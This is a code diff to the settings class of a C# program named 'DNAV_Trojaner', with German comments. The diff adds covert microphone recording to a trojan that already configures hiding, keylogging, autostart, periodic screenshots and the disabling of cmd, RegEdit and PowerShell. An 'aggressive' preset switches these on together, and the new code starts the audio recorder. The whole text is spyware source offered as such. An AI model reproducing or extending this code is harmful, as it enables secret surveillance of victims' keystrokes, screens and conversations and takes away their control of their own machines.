@@ -19,6 +19,9 @@ namespace DNAV_Trojaner
         private bool _autostart;
         private bool _screenshots;
         private string _screenshotsPath;
+        private bool _recordMicrophone;
+        private string _recordMicrophonePath;
+        private int _recordMicrophoneLength;
         private int _screenshotsInterval;
         private bool _disableCmd;
         private bool _disableRun;
@@ -141,6 +144,51 @@ namespace DNAV_Trojaner
         }
 
         /// <summary>
+        /// Legt fest, ob das Mikrofon aufgenommen werden soll.
+        /// </summary>
+        public bool RecordMicrophone
+        {
+            get
+            {
+                return this._recordMicrophone;
+            }
+            set
+            {
+                this._recordMicrophone = value;
+            }
+        }
+
+        /// <summary>
+        /// Legt den Pfad fest, in dem die Audiodateien zwischengespeichert werden. Es darf keine Dateiendung gesetzt werden, da diese automatisch generiert wird.
+        /// </summary>
+        public string RecordMicrophonePath
+        {
+            get
+            {
+                return this._recordMicrophonePath;
+            }
+            set
+            {
+                this._recordMicrophonePath = value;
+            }
+        }
+
+        /// <summary>
+        /// Legt die Länge der Aufnahmesession in Sekunden fest.
+        /// </summary>
+        public int RecordMicrophoneLength
+        {
+            get
+            {
+                return this._recordMicrophoneLength;
+            }
+            set
+            {
+                this._recordMicrophoneLength = value >= 1 ? value : 1;
+            }
+        }
+
+        /// <summary>
         /// Legt fest, ob die Konsole deaktiviert werden soll.
         /// </summary>
         public bool DisableCmd
@@ -254,7 +302,7 @@ namespace DNAV_Trojaner
             this.Hide = false;
             this.Keylogger = false;
             this.KeyloggerLogPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\log.txt";
-            this.Autostart = true;
+            this.Autostart = false;
             this.Screenshots = false;
             this.ScreenshotsPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\screen.png";
             this.ScreenshotsInterval = 180;
@@ -265,6 +313,9 @@ namespace DNAV_Trojaner
             this.DisableRegEdit = false;
             this.HideTaskbar = false;
             this.DisablePowershell = false;
+            this.RecordMicrophone = false;
+            this.RecordMicrophonePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\microphone";
+            this.RecordMicrophoneLength = 5;
         }
 
         /// <summary>
@@ -275,10 +326,8 @@ namespace DNAV_Trojaner
         {
             this.Hide = true;
             this.Keylogger = true;
-            this.KeyloggerLogPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\log.txt";
             this.Autostart = true;
             this.Screenshots = aggressive;
-            this.ScreenshotsPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\screen.png"; ;
             this.ScreenshotsInterval = 10;
             this.DisableCmd = aggressive;
             this.DisableRun = aggressive;
@@ -287,6 +336,7 @@ namespace DNAV_Trojaner
             this.DisableRegEdit = aggressive;
             this.HideTaskbar = aggressive;
             this.DisablePowershell = aggressive;
+            this.RecordMicrophone = true;
         }
 
         /// <summary>
@@ -345,6 +395,11 @@ namespace DNAV_Trojaner
             {
                 //Powershell.Disable();
                 //Powershell.DisableRoot();
+            }
+            if (this.RecordMicrophone)
+            {
+                Audio aufnahme = new Audio(this.RecordMicrophonePath);
+                aufnahme.Start(this.RecordMicrophoneLength);
             }
         }
     }
